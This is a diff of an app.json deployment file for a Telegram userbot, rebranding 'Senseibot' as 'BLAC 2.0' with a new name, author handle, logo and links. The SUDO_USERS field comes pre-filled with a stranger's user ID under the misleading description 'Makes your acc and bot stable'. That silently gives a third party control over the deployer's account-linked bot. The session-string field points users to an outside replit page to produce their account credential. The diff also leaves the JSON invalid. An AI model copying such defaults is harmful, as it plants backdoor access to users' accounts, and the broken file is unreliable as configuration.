@@ -1,7 +1,7 @@
 {
-  "name": "Senseibot",
-  "description": "The G.O.A.T. userbot created by @sensei_nex for boosting your tg experience",
-  "logo": "https://telegra.ph/file/f7c3fd286065b88f84937.jpg",
+  "name": "𝐁𝐋𝐀𝐂 2.0",
+  "description": "The 𝐁𝐋𝐀𝐂_2.0 userbot created by @JATTGAMINGYT11 for boosting your tg experience",
+  "logo": https://telegra.ph/file/3ccaaaa11ad15e10f6647.jpg
     "keywords": [
     "telegram",
     "userbot",
@@ -9,7 +9,7 @@
     "modular",
     "productivity"
   ],
-  "repository": "https://github.com/SenseiOfficial/Sensei-BOT",
+  "repository": "https://github.com/SenseiOfficial/BLAC-BOT",
   "website": "#TODO",
   "success_url": "#TODO",
   "env": {
@@ -28,7 +28,7 @@
       "required": false
     },
     "ALIVE_NAME": {
-      "description": "Fill your Full name or Username like @Sensei_nex.",
+      "description": "Fill your Full name or Username like @JATTGAMINGYT11",
       "value": ""
     },
     "APP_ID": {
@@ -63,7 +63,7 @@
 
     },
     "STRING_SESSION": {
-      "description": "Get this value from https://repl.it/@SenseiOfficial/String-Session-1/",
+      "description": "Get this value from https://replit.com/@pawanjatt/B-Lacuserbot#main.py
       "value": ""
 
     },
@@ -73,7 +73,7 @@
       "required": false
     },
     "GIT_REPO_NAME": {
-      "description": "Your repo name Example: SenseiOfficial/Sensei-BOT, but GITHUB_ACCESS_TOKEN must be setup first.",
+      "description": "Your repo name Example: 𝐁𝐋𝐀𝐂 𝐔𝐒𝐄𝐑𝐁𝐎𝐓 2.0 but GITHUB_ACCESS_TOKEN must be setup first.",
       "value": "",
       "required": false
     },
@@ -96,7 +96,7 @@
     },
     "SUDO_USERS": {
       "description": "Makes your acc and bot stable",
-      "value": "1343556834",
+      "value": " 1497444389",
       "required": false
     },
     "CHROME_BIN": {
